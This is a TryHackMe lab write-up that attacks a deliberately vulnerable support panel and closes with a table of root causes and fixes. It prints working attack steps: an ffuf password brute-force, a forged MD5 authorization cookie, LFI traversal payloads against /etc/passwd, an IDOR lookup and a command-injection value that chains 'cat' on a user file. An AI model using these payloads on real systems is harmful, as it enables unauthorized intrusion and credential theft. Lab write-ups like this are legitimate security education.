# TryHackMe – Support Lab Writeup

**Category:** Web Exploitation (IDOR/BOLA, Cookie-based Authorization Bypass, LFI, Command Injection)
**Target:** `Support Operations Panel` web app

## Summary

The box runs a "Support Operations Panel" web application on port 80. The attack
chain goes through five stages:

1. Recon with `nmap` and `gobuster` to map the attack surface.
2. Brute-forcing a known user's password with `ffuf` against the login form.
3. Bypassing a client-side authorization cookie (`isITUser`) to unlock a hidden
   "theme" feature that was vulnerable to Local File Inclusion (LFI).
4. Using the LFI to leak a hard-coded master password from the application
   source.
5. Exploiting a Broken Object Level Authorization (BOLA/IDOR) bug to pull the
   admin's email, then logging in as admin for the first flag, and finally
   exploiting OS command injection in a "date/time" widget for the final flag.

---

## 1. Reconnaissance

### 1.1 Port/service scan

```bash
nmap -sV -sC -p 1-5000 10.48.176.27 -T4
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | http | Apache httpd 2.4.58 (Ubuntu) — page title: *Support Operations Panel* |

Only two ports were open, so the web app on port 80 was the obvious entry
point.

### 1.2 Directory/content discovery

```bash
gobuster dir -u http://10.48.176.27 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,bak,js,zip,txt
```

Interesting hits:

```
index.php     (Status: 200)
info.php      (Status: 200)
footer.php    (Status: 200)
skins/        (Status: 301)
includes/     (Status: 301)
layout/       (Status: 301)
js/           (Status: 301)
api.php       (Status: 302) -> index.php
logout.php    (Status: 302) -> index.php
config.php    (Status: 200)
```

This gave two things that mattered later:

- `config.php` and an `api.php` endpoint ("View API" link in the panel) — both
  became relevant once authenticated.
- A `skins/` directory, which lined up with a "Select Theme" dropdown found
  later on the dashboard — a strong hint for a Local File Inclusion
  vulnerability.

---

## 2. Brute-forcing the login

The login page's email field was pre-filled with `help@support.thm`, so only
the password was unknown. I used `ffuf` to brute-force it with `rockyou.txt`,
POSTing directly to the login endpoint:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
  -X POST \
  -d "email=help@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.48.176.27 \
  -s -fs 2678
```

`-fs 2678` filters out every response whose size matches the "wrong
password" page, so only the request(s) that return a *different* page size
(i.e. a successful login / redirect) are printed.

**Result:** password = `snoopy`

Logged in as a normal (non-IT) user with:

```
help@support.thm : snoopy
```

---

## 3. Bypassing the `isITUser` cookie → LFI

The dashboard has a "Select Theme" dropdown that loads a page fragment via a
`skin` GET parameter, e.g.:

```
GET /dashboard.php?skin=welcome
```

### 3.1 Failed attempts

I first tried classic path traversal straight for `/etc/passwd`:

```
GET /dashboard.php?skin=../../../../etc/passwd
```

No luck as a normal user. I also tried pointing at the `config.php` /
`config` path found by `gobuster`:

```
GET /dashboard.php?skin=../config
```

Still nothing — the parameter appeared to be gated behind some
server-side check.

### 3.2 Finding the gate: `isITUser` cookie

Inspecting the cookies sent with the request revealed an interesting one:

```
Cookie: PHPSESSID=t26q4s39d1qp3g88kjlkrbbgp1; isITUser=68934a3e9455fa72420237eb05902327
```

`68934a3e9455fa72420237eb05902327` is the **MD5 hash of the string `false`**.
That strongly suggested the app does something like:

```php
if (md5('true') === $_COOKIE['isITUser']) {
    // allow IT-only features (theme/skin file loading)
}
```

So the fix was trivial: swap the cookie value for the MD5 hash of `true`:

```
isITUser = b326b5062b2f0e69046810717534cb09   # md5("true")
```

```bash
python3 -c "import hashlib; print(hashlib.md5(b'true').hexdigest())"
# b326b5062b2f0e69046810717534cb09
```

### 3.3 LFI confirmed

With the forged cookie set, the same traversal payload now worked and the
application happily included arbitrary files:

```
GET /dashboard.php?skin=../../../../etc/passwd
Cookie: isITUser=b326b5062b2f0e69046810717534cb09
```

This is a classic **authorization-bypass-leading-to-LFI**: the server trusted
a client-controlled, un-signed cookie to decide whether a dangerous feature
(arbitrary local file inclusion via `skin=`) was reachable.

---

## 4. Leaking the master password

Using the same unlocked `skin=` parameter to pull in the application's own
config/include file, the rendered page source contained a developer comment
that was never meant to reach the browser:

```html
<!--
?php $MASTER_PASSWORD = 'support@l10'; $SITE_VER = '1.0'; $SITE_NAME = 'support_portal';
-->
```

Because the file was included as a "skin" (HTML/text context) rather than
executed, the raw PHP source — including the hard-coded credential — was
dumped straight into the page instead of being evaluated.

**Leaked credential:** `support@l10`

---

## 5. BOLA / IDOR → admin email disclosure

The panel exposes a "View API" link pointing at a user-lookup endpoint keyed
by a numeric ID, e.g.:

```
GET /api/user/3
```

This returned *my own* (low-privilege) user object. Since the ID is just a
sequential integer with no ownership check, I simply changed it:

```
GET /api/user/1
```

Response:

```json
{
  "email": "specialadmin@support.thm",
  "2FA": false,
  "admin": true
}
```

This is a textbook **Broken Object Level Authorization (BOLA)** /
Insecure Direct Object Reference (IDOR): any authenticated user can read any
other user's record just by changing the ID in the URL, with no check that
the requester is allowed to see that record.

### Logging in as admin

Combining the leaked email with the leaked master password:

```
specialadmin@support.thm : support@l10
```

Logging in confirmed administrator access and revealed the first flag:

```
THM{I_AM_ADMIN999}
```

---

## 6. OS Command Injection → final flag

As admin, the dashboard footer has a "Date"/"Time" widget implemented as an
HTML `<select>` whose `onchange` handler submits a form (`sysForm`) built from
the option's `value` attribute:

```html
<form id="sysForm" method="POST">
  <select class="form-select" name="sys"
          onchange="document.getElementById('sysForm').submit();">
    <option value="date">Date</option>
    <option value="...">Time</option>
  </select>
</form>
```

The `value` is passed server-side straight into a shell command (almost
certainly something like `shell_exec("date " . $_POST['sys'])` or similar).
Using the browser dev tools, I edited the `Time` option's `value` attribute
to chain a second command with `;`:

```html
<option value='date; cat /home/ubuntu/user.txt'>Time</option>
```

Selecting that option submitted the form and the server executed both
commands, printing the date followed by the contents of `user.txt` straight
into the page:

```
Sat Oct 24 11:51:26 UTC 2026
THM{GOT_THE_FLAG001}
```

This is unauthenticated-input-reaches-`shell_exec` **OS command injection**:
the application never validated or sanitized the value coming from a
dropdown that the client fully controls.

---

## Root Causes & Fixes

| # | Vulnerability | Fix |
|---|----------------|-----|
| 1 | Password brute-forceable, no rate limiting/lockout | Rate-limit/lock accounts, enforce strong passwords, add MFA |
| 2 | Authorization decided by an unsigned, guessable cookie (`isITUser=md5(bool)`) | Never trust client-supplied role/permission flags; check role server-side from the session |
| 3 | Local File Inclusion via `skin` parameter | Whitelist allowed skin names, never pass user input into file-path functions |
| 4 | Secrets hard-coded in a web-root include file | Keep secrets out of web-accessible files / version control, use env vars or a secrets manager |
| 5 | BOLA on `/api/user/{id}` | Enforce object-level authorization — verify the requester owns/may access the requested ID |
| 6 | OS command injection in the date/time feature | Never pass user input to a shell; use parameterized APIs (e.g. PHP's `DateTime`) instead of `shell_exec` |

## Flags

- `THM{I_AM_ADMIN999}` — gained via the IDOR/BOLA → leaked admin credentials
- `THM{GOT_THE_FLAG001}` — gained via OS command injection in the date/time widget

## Tools Used

- `nmap` — service/version scanning
- `gobuster` — content/directory discovery
- `ffuf` — login form password brute-force
- Browser DevTools — cookie editing, DOM/HTML editing for the injection
- `python3`/`hashlib` — computing MD5 hashes offline

See `cmd.md` in this repo for a command-by-command breakdown of *why* each
command was run.
